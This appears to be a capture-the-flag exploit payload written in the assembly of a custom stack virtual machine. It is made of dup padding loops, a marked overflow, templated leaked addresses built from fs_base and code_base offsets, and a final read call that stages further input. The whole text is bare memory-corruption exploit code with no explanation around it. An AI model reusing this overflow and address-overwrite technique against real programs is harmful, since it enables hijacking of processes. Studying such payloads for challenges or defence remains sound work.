read equ 0xf06d7659e3c6851c
write equ 0x14242c101498d2fc

push8 0
[label]
dup
dup
dup
dup
dup
dup
dup
dup
add 4
dup
push8 0x1ffc
sub
ja 0x1000+[label]
dup
dup
dup
dup
dup
dup
push1 0
push8 0
push4 0
push2 0
push1 0
; overflow: 8
times (0x740-8)//8 dup
push8 {fs_base}
push8 {fs_base+0x7f83eeddb0e0-0x7f83eedda740}
push8 {code_base+0x1000}
push8 0
dup
dup
times (0x300-0x30)//8 dup
push8 {code_base+0x1400}
push8 8
push8 0
lea 0
modcall read
hlt
